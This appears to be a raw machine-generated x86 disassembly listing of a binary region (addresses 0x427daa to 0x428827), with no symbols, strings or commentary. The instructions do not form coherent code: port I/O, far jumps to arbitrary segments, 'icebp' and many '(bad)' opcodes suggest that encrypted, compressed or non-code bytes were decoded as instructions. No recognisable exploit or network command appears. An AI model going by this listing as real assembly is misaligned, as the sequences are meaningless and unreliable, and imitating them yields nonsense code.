  427daa:	xor    eax,0xad0cbc30
  427daf:	lds    edi,FWORD PTR [edi+0x303e42a4]
  427db5:	fsub   DWORD PTR [ebp+0x1eff69bf]
  427dbb:	cmp    cl,BYTE PTR [ebx+0x1a388132]
  427dc1:	icebp  
  427dc2:	xchg   BYTE PTR [edx],ch
  427dc4:	out    0x7a,al
  427dc6:	outs   dx,DWORD PTR ds:[esi]
  427dc7:	(bad)  
  427dc8:	lods   eax,DWORD PTR ds:[esi]
  427dc9:	in     al,dx
  427dca:	add    DWORD PTR [ebx],edi
  427dcc:	mov    eax,ds:0xcd456bc3
  427dd1:	jmp    0x7e62:0x2df8
  427dd7:	mov    ds:0x1edf456d,eax
  427ddc:	adc    eax,0x1b455cbf
  427de1:	fld    TBYTE PTR [edx-0x1102deac]
  427de7:	pop    eax
  427de8:	dec    ebx
  427de9:	rcl    DWORD PTR [eax+edx*8+0x3cbade4d],cl
  427df0:	sub    ch,BYTE PTR [edx]
  427df2:	and    eax,0x4b01ea69
  427df7:	adc    ah,BYTE PTR [ebp+ebp*8-0x63]
  427dfb:	mov    ebx,0x7b019134
  427e00:	call   0x85a5:0x6bc0b7b5
  427e07:	pop    esp
  427e08:	sub    BYTE PTR [esi],cl
  427e0a:	lds    edx,FWORD PTR [esp+edi*1-0x1d]
  427e0e:	fwait
  427e0f:	mov    bh,BYTE PTR [edx+0x6648a4a3]
  427e15:	dec    ecx
  427e16:	push   ebx
  427e17:	in     eax,dx
  427e18:	ret    
  427e19:	in     eax,dx
  427e1a:	xor    ecx,DWORD PTR [edi]
  427e1c:	js     0x427e2e
  427e1e:	in     al,dx
  427e1f:	(bad)  
  427e20:	mov    ds:0xd0e8692a,al
  427e25:	or     BYTE PTR [ecx-0x15],bh
  427e28:	xchg   BYTE PTR [edi-0x4a5c92ac],ah
  427e2e:	enter  0xdebd,0x79
  427e32:	out    dx,al
  427e33:	je     0x427e2f
  427e35:	pop    edx
  427e36:	das    
  427e37:	cmp    ah,dl
  427e39:	out    0x4d,al
  427e3b:	pushf  
  427e3c:	mov    ds:0x96e4da63,al
	...
  427eb1:	add    BYTE PTR [eax],al
  427eb3:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  427eba:	mov    dh,0xf7
  427ebc:	mov    ebx,esi
  427ebe:	cmp    ebx,edx
  427ec0:	mov    BYTE PTR [eax],dh
  427ec2:	scas   eax,DWORD PTR es:[edi]
  427ec3:	mov    ah,0xd3
  427ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ec6:	add    DWORD PTR [eax],eax
  427ec8:	cmc    
  427ec9:	add    BYTE PTR [eax],al
  427ecb:	add    BYTE PTR [edx-0x1459411b],dh
  427ed1:	retf   0x4aac
  427ed4:	dec    ebp
  427ed5:	fcomp  QWORD PTR [ebp+0x7e]
  427ed8:	sub    eax,0xbee59fa0
  427edd:	nop
  427ede:	xor    eax,0x8cc25c83
  427ee3:	in     al,dx
  427ee4:	pop    ecx
  427ee5:	jmp    0xef379de0
  427eea:	cwde   
  427eeb:	or     esi,eax
  427eed:	icebp  
  427eee:	jne    0x427ef6
  427ef0:	stos   BYTE PTR es:[edi],al
  427ef1:	push   esp
  427ef2:	lahf   
  427ef3:	push   0x9aad51c4
  427ef8:	daa    
  427ef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427efa:	cmp    eax,DWORD PTR [esi-0x622383b1]
  427f00:	bound  ebx,QWORD PTR [eax]
  427f02:	pop    edi
  427f03:	inc    ecx
  427f04:	sbb    cl,BYTE PTR [edx+0x75c4ac60]
  427f0a:	daa    
  427f0b:	scas   al,BYTE PTR es:[edi]
  427f0c:	test   eax,0x34c439dd
  427f11:	retf   
  427f12:	inc    edx
  427f13:	mov    ah,0xc0
  427f15:	sar    DWORD PTR [edx-0x7],1
  427f18:	loope  0x427eb1
  427f1a:	adc    eax,0x3b227d68
  427f1f:	mov    WORD PTR [edx+0x282305be],cs
  427f25:	mov    ebp,0xcba09d2e
  427f2a:	ds pop eax
  427f2c:	stos   DWORD PTR es:[edi],eax
  427f2d:	stc    
  427f2e:	add    esp,esi
  427f30:	xchg   BYTE PTR [ebp+0x5f282e59],al
  427f36:	inc    edx
  427f37:	stos   BYTE PTR es:[edi],al
  427f38:	dec    eax
  427f3a:	scas   eax,DWORD PTR es:[edi]
  427f3b:	int    0x77
  427f3d:	ins    DWORD PTR es:[edi],dx
  427f3e:	int    0xef
  427f40:	mov    bh,0x6a
  427f42:	in     eax,0x30
  427f44:	ins    DWORD PTR es:[edi],dx
  427f45:	mov    BYTE PTR [ebx],0xd4
  427f48:	inc    BYTE PTR [ecx-0x33b59cae]
  427f4e:	sbb    al,BYTE PTR [edx+0x10a1e22]
  427f54:	sbb    ah,dh
  427f56:	scas   eax,DWORD PTR es:[edi]
  427f57:	ins    BYTE PTR es:[edi],dx
  427f58:	ins    DWORD PTR es:[edi],dx
  427f59:	fldcw  WORD PTR [edi+0x7610a170]
  427f5f:	mov    ecx,0xd6cf75e2
  427f64:	imul   ebx,DWORD PTR [eax+ecx*2],0xbdaa8654
  427f6b:	sahf   
  427f6c:	push   esi
  427f6d:	js     0x427f67
  427f6f:	dec    edx
  427f70:	stos   BYTE PTR es:[edi],al
  427f71:	test   eax,0x4987bd46
  427f76:	mov    DWORD PTR [eax+0x833c3e6],eax
  427f7c:	cmp    al,0x2d
  427f7e:	mov    ch,0x5e
  427f80:	lods   al,BYTE PTR ds:[esi]
  427f81:	jp     0x427fc6
  427f83:	nop
  427f84:	data16 jns 0x427f88
  427f87:	out    dx,al
  427f88:	cmp    eax,0xfac7d09e
  427f8d:	or     BYTE PTR [ebx+0x5ce08981],ch
  427f93:	popa   
  427f94:	push   esp
  427f95:	jnp    0x427f41
  427f97:	push   ebx
  427f98:	mov    ch,0x77
  427f9a:	gs cs test al,0x2d
  427f9e:	sar    BYTE PTR [ecx-0x24],cl
  427fa1:	cmp    DWORD PTR [esi+edi*8-0x5f656e9],edi
  427fa8:	mov    ecx,0x95b34bea
  427fad:	lds    edx,FWORD PTR [edi-0x31af00f7]
  427fb3:	xchg   esp,eax
  427fb4:	fisttp QWORD PTR [ebx+0x52]
  427fb7:	fst    QWORD PTR [esi-0x80]
  427fba:	test   DWORD PTR ds:0x49a72bd7,ebx
  427fc0:	adc    al,BYTE PTR [eax]
	...
  428032:	add    BYTE PTR [eax],al
  428034:	or     al,0x6d
  428036:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42803c:	mov    DWORD PTR [ebx+0x5a],edx
  42803f:	xchg   DWORD PTR [edx+0x76],eax
  428042:	mov    cl,0xb9
  428044:	enter  0x1a8,0x0
  428048:	cmc    
  428049:	add    BYTE PTR [eax],al
  42804b:	add    bh,cl
  42804d:	retf   0xd64d
  428050:	dec    edi
  428051:	fistp  DWORD PTR ds:0x944a4914
  428057:	nop
  428058:	cli    
  428059:	cmp    bh,BYTE PTR [edi-0x5d9b7d82]
  42805f:	pop    ebp
  428060:	jne    0x428070
  428062:	mov    bh,0xce
  428064:	test   al,0x39
  428066:	outs   dx,DWORD PTR ds:[esi]
  428067:	retf   0x384
  42806a:	sahf   
  42806b:	hlt    
  42806c:	scas   eax,DWORD PTR es:[edi]
  42806d:	cli    
  42806e:	ins    BYTE PTR es:[edi],dx
  42806f:	or     al,ah
  428071:	jecxz  0x4280bb
  428073:	or     eax,0x8caedf07
  428078:	and    esi,DWORD PTR ds:0x5317993f
  42807e:	ins    DWORD PTR es:[edi],dx
  42807f:	or     ch,BYTE PTR [eax+0x182c974f]
  428085:	sbb    BYTE PTR [eax-0x2e],0x45
  428089:	xor    al,0x73
  42808b:	scas   eax,DWORD PTR es:[edi]
  42808c:	out    0x59,al
  42808e:	cmp    dl,ch
  428090:	mov    ds:0x8f7a73f0,eax
  428095:	xchg   ebx,eax
  428096:	in     al,0x7a
  428098:	or     bl,bh
  42809a:	lods   eax,DWORD PTR ds:[esi]
  42809b:	push   eax
  42809c:	pushf  
  42809d:	or     edx,DWORD PTR [ebx-0x1377a158]
  4280a3:	test   al,0x28
  4280a5:	aam    0x63
  4280a7:	xor    DWORD PTR [edi+0x7c],ecx
  4280aa:	shl    edi,1
  4280ac:	inc    ebx
  4280ad:	test   DWORD PTR ds:0xade2da8e,edx
  4280b3:	push   eax
  4280b4:	dec    ebx
  4280b5:	and    BYTE PTR [eax],cl
  4280b7:	jle    0x428112
  4280b9:	scas   eax,DWORD PTR es:[edi]
  4280ba:	outs   dx,DWORD PTR ds:[esi]
  4280bb:	cmp    BYTE PTR [ecx+0x4f],bl
  4280be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280bf:	out    dx,eax
  4280c0:	adc    al,0x47
  4280c2:	or     esp,ebx
  4280c4:	pop    es
  4280c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280c6:	stos   DWORD PTR es:[edi],eax
  4280c7:	pop    es
  4280c8:	dec    edx
  4280c9:	push   0x74
  4280cb:	push   edx
  4280cc:	pop    eax
  4280cd:	retf   0x4336
  4280d0:	(bad)  
  4280d1:	mov    al,0x7d
  4280d3:	pop    esp
  4280d4:	inc    esp
  4280d5:	out    0xa9,al
  4280d7:	clc    
  4280d8:	sub    al,0x62
  4280da:	add    edx,ecx
  4280dc:	ja     0x42806c
  4280de:	(bad)  
  4280df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280e0:	retf   
  4280e1:	fisttp DWORD PTR [edx+0x2c93e754]
  4280e7:	mov    edx,DWORD PTR [eax-0x798d9828]
  4280ed:	sub    ah,BYTE PTR ds:0x52d2a2ae
  4280f3:	test   ebx,edi
  4280f5:	cmp    al,0xb1
  4280f7:	in     eax,dx
  4280f8:	mov    cl,0xf1
  4280fa:	pop    ss
  4280fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280fc:	hlt    
  4280fd:	test   dh,bh
  4280ff:	pop    edi
  428100:	mov    edi,0x5d1f932d
  428105:	imul   BYTE PTR [esp+eax*8]
  428108:	inc    ebx
  428109:	jae    0x42813d
  42810b:	jmp    0x42810f
  42810d:	fimul  DWORD PTR [esi+eax*8-0x7201e554]
  428114:	xor    eax,0x8f2620ec
  428119:	mov    esi,0x512e196f
  42811e:	xor    DWORD PTR ds:[eax-0x7afc38ce],eax
  428125:	jae    0x428109
  428127:	pushf  
  428128:	mov    BYTE PTR [esp+eax*1+0x68950853],bl
  42812f:	data16 fwait
  428131:	or     DWORD PTR [edx+0x7e],0x6c1d017d
  428138:	cmp    eax,0xd0fd54f9
  42813d:	cmp    al,0xf8
  42813f:	xor    DWORD PTR [edx+0x0],ebp
	...
  4281b1:	add    BYTE PTR [eax],al
  4281b3:	add    BYTE PTR [esi],bl
  4281b5:	inc    ecx
  4281b6:	fdiv   QWORD PTR [edi+ebx*8+0x79eb7ebd]
  4281bd:	stos   BYTE PTR es:[edi],al
  4281be:	push   0xd7b5544f
  4281c3:	xor    al,0xbd
  4281c5:	test   eax,0xf50001
  4281ca:	add    BYTE PTR [eax],al
  4281cc:	push   cs
  4281cd:	(bad)  
  4281ce:	das    
  4281cf:	cmp    ecx,DWORD PTR [edi-0x4755394a]
  4281d5:	mov    eax,?
  4281d7:	xor    esi,DWORD PTR [edx+0x57]
  4281da:	out    0x63,al
  4281dc:	mov    ah,0xc5
  4281de:	ret    
  4281df:	(bad)  
  4281e0:	retf   0xb391
  4281e3:	inc    ebp
  4281e4:	clts   
  4281e6:	xor    al,0xea
  4281e8:	cmp    dh,BYTE PTR [edx+eax*8]
  4281eb:	add    dl,BYTE PTR [esi+0x50330a3c]
  4281f1:	or     eax,0x7cf40359
  4281f6:	xchg   edx,eax
  4281f7:	sub    edx,DWORD PTR [ebx]
  4281f9:	js     0x42825f
  4281fb:	mov    bh,0xf1
  4281fd:	inc    esp
  4281fe:	or     edi,DWORD PTR [edx]
  428200:	dec    esp
  428201:	sub    DWORD PTR [ecx],edi
  428203:	and    DWORD PTR [edi+eax*4+0x63ca715b],esi
  42820a:	or     DWORD PTR [esi],edx
  42820c:	push   eax
  42820d:	lods   al,BYTE PTR ds:[esi]
  42820e:	fsubr  st,st(5)
  428210:	sub    BYTE PTR [ecx],dl
  428212:	retf   0x7f85
  428215:	rcl    DWORD PTR [edx-0x4828755a],cl
  42821b:	rcl    BYTE PTR [edx+ebx*4+0x5f],1
  42821f:	adc    al,0xb7
  428221:	or     DWORD PTR [ebp-0x25],edi
  428224:	pop    eax
  428225:	inc    esi
  428226:	or     bx,si
  428229:	shl    BYTE PTR [ebx],cl
  42822b:	cmp    BYTE PTR [eax+0x22ce7c6b],dl
  428231:	iret   
  428232:	pop    ebp
  428233:	data16 cli 
  428235:	or     BYTE PTR [esi+0x54],bl
  428238:	addr16 xchg edi,eax
  42823a:	ret    0x72e3
  42823d:	nop
  42823e:	xchg   esp,eax
  42823f:	out    dx,al
  428240:	xor    al,0xf4
  428242:	or     BYTE PTR [edi],ch
  428244:	push   ebx
  428245:	fwait
  428246:	and    ch,dh
  428248:	imul   eax,ecx,0x6fd2c088
  42824e:	xor    BYTE PTR [esi],bh
  428250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428251:	test   al,0xe0
  428253:	out    0x73,al
  428255:	adc    al,0x8
  428257:	xor    DWORD PTR [eax+0x8],edi
  42825a:	jae    0x428276
  42825c:	cld    
  42825d:	cmp    BYTE PTR [edx-0x35],dl
  428260:	adc    al,BYTE PTR [edx]
  428262:	and    bh,BYTE PTR [edx+0x816dd01]
  428268:	ret    0x4077
  42826b:	inc    edx
  42826c:	jns    0x4282b6
  42826e:	dec    eax
  42826f:	out    0xb9,al
  428271:	jb     0x4281fd
  428273:	(bad)  
  428274:	mov    bl,0x28
  428276:	cmc    
  428277:	dec    esp
  428278:	imul   eax,DWORD PTR [ecx],0x5b
  42827b:	push   esp
  42827c:	rol    ah,0xda
  42827f:	test   al,0x46
  428281:	ins    DWORD PTR es:[edi],dx
  428282:	sub    bl,BYTE PTR [edi+0x34]
  428285:	outs   dx,DWORD PTR ds:[esi]
  428286:	push   es
  428287:	dec    esi
  428288:	rcl    BYTE PTR [edi],1
  42828a:	xchg   ecx,eax
  42828b:	loop   0x42825f
  42828d:	jb     0x4282e1
  42828f:	ins    BYTE PTR es:[edi],dx
  428290:	sbb    eax,0x49c6a572
  428295:	sub    al,0xfc
  428297:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428298:	cmc    
  428299:	in     eax,dx
  42829a:	xchg   ecx,eax
  42829b:	loop   0x42825e
  42829d:	push   ebx
  42829e:	dec    ebp
  42829f:	rol    BYTE PTR [edi+esi*4+0x3a],cl
  4282a3:	(bad)  
  4282a4:	(bad)  [eax-0x6322f533]
  4282aa:	scas   eax,DWORD PTR es:[edi]
  4282ab:	gs dec eax
  4282ad:	or     al,0xef
  4282af:	lods   eax,DWORD PTR ds:[esi]
  4282b1:	cli    
  4282b2:	xor    BYTE PTR cs:[esi-0x21a9e669],bh
  4282b9:	jecxz  0x428300
  4282bb:	mov    ds:0x5d0c3b9e,eax
  4282c0:	jae    0x4282c2
	...
  428332:	add    BYTE PTR [eax],al
  428334:	adc    bl,BYTE PTR ds:0xaf3f8832
  42833a:	mov    edx,0x671fe09f
  42833f:	pusha  
  428340:	fst    QWORD PTR [eax-0x5a]
  428343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428344:	mov    dl,0xaa
  428346:	add    DWORD PTR [eax],eax
  428348:	cmc    
  428349:	add    BYTE PTR [eax],al
  42834b:	add    BYTE PTR [ecx+0x41],dl
  42834e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42834f:	repz pop ss
  428351:	add    ebp,ebp
  428353:	into   
  428354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428355:	fwait
  428356:	ss nop
  428358:	fucom  st(1)
  42835a:	pop    esp
  42835b:	and    BYTE PTR [edi-0x5],ch
  42835e:	aad    0x19
  428360:	and    esi,DWORD PTR [edx+ebx*2]
  428363:	test   DWORD PTR ds:0x6081252e,edx
  428369:	mov    ds:0x19d0aac9,eax
  42836e:	dec    esp
  42836f:	ss sbb eax,0xdfc774c6
  428375:	adc    ebp,ecx
  428377:	xchg   ebp,eax
  428378:	dec    ebp
  428379:	jmp    0x4283d0
  42837b:	xchg   BYTE PTR [edi+0x1],al
  42837e:	and    BYTE PTR [ecx],al
  428380:	popa   
  428381:	push   es
  428382:	pop    esp
  428383:	xchg   esi,eax
  428384:	mov    eax,0xe49d9fa5
  428389:	mov    cl,0x19
  42838b:	retf   
  42838c:	xor    BYTE PTR [edx],al
  42838e:	cwde   
  42838f:	pop    eax
  428390:	rol    BYTE PTR [ecx],1
  428392:	push   cs
  428393:	bound  edi,QWORD PTR [esi+0x7]
  428396:	mov    al,0x66
  428398:	scas   al,BYTE PTR es:[edi]
  428399:	pop    ss
  42839a:	jo     0x42840c
  42839c:	lock pop ecx
  42839e:	std    
  42839f:	xchg   ebx,esi
  4283a1:	lds    ebp,FWORD PTR [ebp+0x7f]
  4283a4:	or     eax,0x562a2a31
  4283a9:	loop   0x42837a
  4283ab:	jb     0x4283d0
  4283ad:	pop    esi
  4283ae:	push   ecx
  4283af:	xor    DWORD PTR [ecx],ebx
  4283b1:	aad    0xde
  4283b3:	in     al,0xa
  4283b5:	xchg   DWORD PTR [esi-0x4a],eax
  4283b8:	inc    edi
  4283b9:	std    
  4283ba:	mov    eax,DWORD PTR [ebp-0x71]
  4283bd:	mov    esi,0xa5b73ba4
  4283c2:	shr    DWORD PTR [edi-0x59ba273a],1
  4283c8:	rol    DWORD PTR [ebx-0x6750c76f],0x8a
  4283cf:	ja     0x42836b
  4283d1:	mov    ah,0xc7
  4283d3:	sbb    al,0x62
  4283d5:	in     eax,dx
  4283d6:	push   ds
  4283d7:	in     al,0xaf
  4283d9:	stos   BYTE PTR es:[edi],al
  4283da:	jmp    0x428390
  4283dc:	dec    edi
  4283dd:	inc    edi
  4283de:	data16 fisubr DWORD PTR [esi+0x39c4db18]
  4283e5:	fucomip st,st(4)
  4283e7:	sbb    cl,BYTE PTR [edx]
  4283e9:	xlat   BYTE PTR ds:[ebx]
  4283ea:	scas   eax,DWORD PTR es:[edi]
  4283eb:	or     al,0x6d
  4283ed:	fld    QWORD PTR [edx+ecx*8-0x520b3670]
  4283f4:	retf   0xd1c5
  4283f7:	jg     0x4283b4
  4283f9:	cs ja  0x4283af
  4283fc:	sub    al,BYTE PTR [esi-0x4c124722]
  428402:	lea    eax,[eax+0xf]
  428405:	xchg   ebp,eax
  428406:	inc    edx
  428407:	cwde   
  428408:	fs cli 
  42840a:	mov    eax,ds:0x8a91ffcd
  42840f:	inc    esi
  428410:	cwde   
  428411:	mov    gs,WORD PTR [esi-0x596745d3]
  428417:	stos   DWORD PTR es:[edi],eax
  428418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428419:	shl    BYTE PTR [bp+si-0x56],cl
  42841d:	adc    BYTE PTR [ebx+ebx*4],dh
  428420:	in     eax,dx
  428421:	test   eax,0xea28eba1
  428426:	int    0xef
  428428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428429:	pop    es
  42842a:	push   ss
  42842b:	fucomi st,st(1)
  42842d:	mov    al,ds:0xe342d83a
  428432:	adc    dl,BYTE PTR [ecx+ecx*2+0x5b9597f2]
  428439:	inc    esp
  42843a:	(bad)  
  42843b:	cld    
  42843c:	(bad)  
  42843d:	loop   0x428432
  42843f:	iret   
  428440:	les    eax,FWORD PTR [eax]
	...
  4284b2:	add    BYTE PTR [eax],al
  4284b4:	pop    esp
  4284b5:	test   al,0xc0
  4284b7:	stos   DWORD PTR es:[edi],eax
  4284b8:	hlt    
  4284b9:	jmp    0x42853a
  4284bb:	jmp    FWORD PTR [ecx-0x4894cbf9]
  4284c1:	xchg   bl,bl
  4284c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284c5:	stos   DWORD PTR es:[edi],eax
  4284c6:	add    DWORD PTR [eax],eax
  4284c8:	cmc    
  4284c9:	add    BYTE PTR [eax],al
  4284cb:	add    BYTE PTR [eax+0x764d67fd],ah
  4284d1:	(bad)
  4284d5:	push   0xffffffb9
  4284d7:	scas   eax,DWORD PTR es:[edi]
  4284d8:	jecxz  0x42853a
  4284da:	rol    bl,0x3d
  4284dd:	bnd call 0xc71ec8a1
  4284e3:	pop    eax
  4284e4:	aam    0x20
  4284e6:	adc    bl,al
  4284e8:	jmp    0x8bf5:0xeafcf275
  4284ef:	mov    bh,0xbf
  4284f1:	mov    ds:0x3f2fcb21,eax
  4284f6:	fwait
  4284f7:	pop    es
  4284f8:	adc    esi,DWORD PTR [edi+0x20]
  4284fb:	pop    ss
  4284fc:	enter  0x72d7,0x94
  428500:	xor    esi,DWORD PTR [edi+0x7edc4250]
  428506:	pop    esi
  428507:	inc    edi
  428508:	adc    eax,0x3df0f6f3
  42850d:	icebp  
  42850e:	or     dh,dh
  428510:	xchg   ebx,eax
  428511:	pop    edi
  428512:	jmp    0x428545
  428514:	mov    edi,0x50c1a2f
  428519:	adc    eax,DWORD PTR [ebp+eiz*2-0x7]
  42851d:	stos   BYTE PTR es:[edi],al
  42851e:	push   0x2e9f880f
  428523:	inc    esp
  428524:	sbb    edi,DWORD PTR [esi+0xa]
  428527:	shl    DWORD PTR [edx-0x69],cl
  42852a:	and    ah,BYTE PTR [edx]
  42852c:	stos   BYTE PTR es:[edi],al
  42852d:	enter  0xe35a,0x5b
  428531:	sbb    al,0x89
  428533:	pop    edx
  428534:	push   ebx
  428535:	fdivr  DWORD PTR [eax+ebx*4]
  428538:	jae    0x428592
  42853a:	xor    eax,0x97fedde0
  42853f:	inc    eax
  428540:	or     al,0xdd
  428542:	je     0x428597
  428544:	xor    edx,DWORD PTR [eax-0x5d]
  428547:	fs jb  0x428540
  42854a:	lea    edi,[ebx-0x78c3d706]
  428550:	jmp    DWORD PTR [esi+0x1]
  428553:	call   FWORD PTR [ebx+eiz*8]
  428556:	mov    ds:0xa2fcd3f9,eax
  42855b:	add    BYTE PTR [edi+0x20c595d6],dh
  428561:	imul   edi,DWORD PTR [ebx-0x2e],0x49
  428565:	push   edx
  428566:	imul   edx,DWORD PTR [eax-0x38a63c60],0xffffff8c
  42856d:	clc    
  42856e:	mov    edx,0x5a4d38ec
  428573:	stos   DWORD PTR es:[edi],eax
  428574:	sbb    DWORD PTR ss:[ecx+0x1785a1ca],0x8186196d
  42857f:	add    ah,ah
  428581:	mov    ebp,0xf5393521
  428586:	hlt    
  428587:	jmp    0x9cbf:0xa12ee211
  42858e:	in     eax,dx
  42858f:	int3   
  428590:	nop
  428591:	add    eax,0x405f28ad
  428596:	aas    
  428597:	jo     0x428551
  428599:	add    BYTE PTR [edi+0x5c],dl
  42859c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42859d:	int    0xf8
  42859f:	push   es
  4285a0:	(bad)  
  4285a1:	sbb    ebx,ecx
  4285a3:	arpl   WORD PTR [eax+0x23],ax
  4285a6:	lods   eax,DWORD PTR ds:[esi]
  4285a7:	xchg   edx,eax
  4285a8:	bound  edi,QWORD PTR [edx]
  4285aa:	jmp    0x4285cb
  4285ac:	inc    ebx
  4285ad:	(bad)  
  4285ae:	cmp    dl,al
  4285b0:	dec    ebx
  4285b1:	mov    dl,0x37
  4285b3:	pusha  
  4285b4:	push   0xffffffd9
  4285b6:	mov    cl,0x62
  4285b8:	stos   BYTE PTR es:[edi],al
  4285b9:	call   0xb672:0x7988d92d
  4285c0:	adc    al,0x0
	...
  428632:	add    BYTE PTR [eax],al
  428634:	add    DWORD PTR [esi-0x70],edx
  428637:	out    dx,al
  428638:	xlat   BYTE PTR ds:[ebx]
  428639:	out    dx,al
  42863a:	jg     0x42863b
  42863c:	(bad)  
  42863d:	dec    esi
  42863e:	cmp    al,0xb7
  428640:	jae    0x42861e
  428642:	pop    esp
  428643:	or     DWORD PTR [esp+ebp*4+0xf50001],ebx
  42864a:	add    BYTE PTR [eax],al
  42864c:	dec    edi
  42864d:	cdq    
  42864e:	push   ss
  42864f:	and    al,0xfa
  428651:	pop    ebx
  428652:	mov    dl,0x80
  428654:	nop
  428655:	jnp    0x4286a7
  428657:	pop    esp
  428658:	sbb    DWORD PTR [edi],0xffffffa5
  42865b:	xor    dh,dl
  42865d:	push   ss
  42865e:	sub    DWORD PTR [edx-0x6b7a7392],edi
  428664:	fimul  DWORD PTR ds:0x9ec4805f
  42866a:	xor    eax,0x3c1026b1
  42866f:	mov    bh,0xa3
  428671:	pop    eax
  428672:	cdq    
  428673:	out    0x69,al
  428675:	ins    BYTE PTR es:[edi],dx
  428676:	rcr    cl,cl
  428678:	aas    
  428679:	test   al,0x20
  42867b:	add    dh,BYTE PTR [edx]
  42867d:	push   ebx
  42867e:	cwde   
  42867f:	push   ebx
  428680:	ss ret 
  428682:	jle    0x4286f1
  428684:	iret   
  428685:	xor    DWORD PTR [ecx+0x2d],eax
  428688:	and    dh,BYTE PTR [eax+0x60]
  42868b:	sbb    eax,0x2e9c8dc
  428690:	pop    edi
  428691:	call   0x64d31113
  428696:	push   0x10463417
  42869b:	(bad)  
  42869c:	not    BYTE PTR [ebx+ecx*2-0x61]
  4286a0:	xor    al,0xd7
  4286a2:	cmp    BYTE PTR [eax],dh
  4286a4:	dec    eax
  4286a5:	pop    edx
  4286a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4286a7:	mov    dl,0x4d
  4286a9:	push   0x57
  4286ab:	mov    WORD PTR [eax-0x531803c7],fs
  4286b1:	dec    ebp
  4286b2:	inc    ecx
  4286b3:	call   0x4c28:0xe3c8a461
  4286ba:	xchg   edi,eax
  4286bb:	adc    BYTE PTR [esi],bh
  4286bd:	imul   esi,DWORD PTR ds:0xe0f0d884,0x5d990a8c
  4286c7:	cmp    cl,dh
  4286c9:	es ja  0x4286a6
  4286cc:	cmp    DWORD PTR [esi],0xdb9ecbb2
  4286d2:	idiv   DWORD PTR [edi]
  4286d4:	hlt    
  4286d5:	xchg   BYTE PTR [ebx-0x40],ah
  4286d8:	loope  0x428732
  4286da:	je     0x4286ec
  4286dc:	cmp    DWORD PTR [bx+di-0x2964],ecx
  4286e1:	out    dx,eax
  4286e2:	ins    BYTE PTR es:[edi],dx
  4286e3:	lds    edi,FWORD PTR [ecx]
  4286e5:	fcom   DWORD PTR [edi-0x7d]
  4286e8:	adc    edx,DWORD PTR [eax]
  4286ea:	loope  0x4286db
  4286ec:	xchg   ebx,eax
  4286ed:	outs   dx,DWORD PTR ds:[esi]
  4286ee:	(bad)  
  4286ef:	in     eax,0x37
  4286f1:	pop    ss
  4286f2:	mov    ah,dl
  4286f4:	pop    es
  4286f5:	inc    eax
  4286f6:	jne    0x428777
  4286f8:	sbb    BYTE PTR [eax+edx*2],0x6b
  4286fc:	fstp   DWORD PTR [esi+0x21b77b3]
  428702:	arpl   WORD PTR [edi-0x63],sp
  428705:	fldenv [esi-0x6e]
  428708:	xor    al,0x84
  42870a:	rcl    esp,cl
  42870c:	inc    eax
  42870d:	xor    DWORD PTR ds:0xeb35992,edx
  428713:	sar    BYTE PTR [edi],cl
  428715:	mov    ebp,0x696cf41c
  42871a:	push   0x44195ad4
  42871f:	sub    BYTE PTR [ebx+eax*2-0x7971c5a2],dh
  428726:	adc    ah,BYTE PTR [ebp+0x6e]
  428729:	cmp    ebp,DWORD PTR [edx]
  42872b:	cmp    esi,ebp
  42872d:	sub    dh,bh
  42872f:	outs   dx,DWORD PTR ds:[esi]
  428730:	jo     0x42877b
  428732:	xchg   BYTE PTR [eax-0x6e88048a],ch
  428738:	cmp    eax,0x240d1a10
  42873d:	push   ebp
  42873e:	outs   dx,BYTE PTR ds:[esi]
  42873f:	jo     0x42872c
	...
  4287b1:	add    BYTE PTR [eax],al
  4287b3:	add    BYTE PTR [edx],bl
  4287b5:	mov    cl,BYTE PTR [ebx]
  4287b7:	inc    ebp
  4287b8:	fwait
  4287b9:	lds    ebx,FWORD PTR [esi-0x21]
  4287bc:	xor    edi,DWORD PTR [edx+0x2e5b299e]
  4287c2:	or     al,ch
  4287c4:	xchg   ecx,eax
  4287c5:	lods   eax,DWORD PTR ds:[esi]
  4287c6:	add    DWORD PTR [eax],eax
  4287c8:	cmc    
  4287c9:	add    BYTE PTR [eax],al
  4287cb:	add    BYTE PTR [eax+0x58],ch
  4287ce:	mov    eax,ds:0x57acb474
  4287d3:	sar    esp,1
  4287d5:	out    dx,eax
  4287d6:	cli    
  4287d7:	cmp    eax,0x510074bb
  4287dc:	push   ds
  4287dd:	cmp    al,0x60
  4287df:	and    bh,BYTE PTR [esi-0x744d52e8]
  4287e5:	stos   BYTE PTR es:[edi],al
  4287e6:	je     0x4287a7
  4287e8:	push   edi
  4287e9:	inc    esp
  4287ea:	xor    BYTE PTR [ecx-0x6e22d45],0xa5
  4287f1:	inc    ebp
  4287f2:	or     DWORD PTR [edx+ebx*2-0x28],esp
  4287f6:	int3   
  4287f7:	sbb    al,0xf7
  4287f9:	push   es
  4287fa:	jmp    0x98381895
  4287ff:	or     al,0xdd
  428801:	sar    DWORD PTR [ebx-0x4e],cl
  428804:	daa    
  428805:	or     al,0x9a
  428807:	iret   
  428808:	out    dx,al
  428809:	or     BYTE PTR [ebx-0x7b5140dd],ah
  42880f:	mov    cl,0x9f
  428811:	test   ebx,ebp
  428813:	pushf  
  428814:	push   ds
  428815:	sub    eax,esi
  428817:	(bad)  
  428818:	scas   al,BYTE PTR es:[edi]
  428819:	jmp    0x428841
  42881b:	loope  0x42887d
  42881d:	adc    eax,0xd3e0408c
  428822:	xor    eax,0x56f9f7ac
  428827:	loope  0x42887a
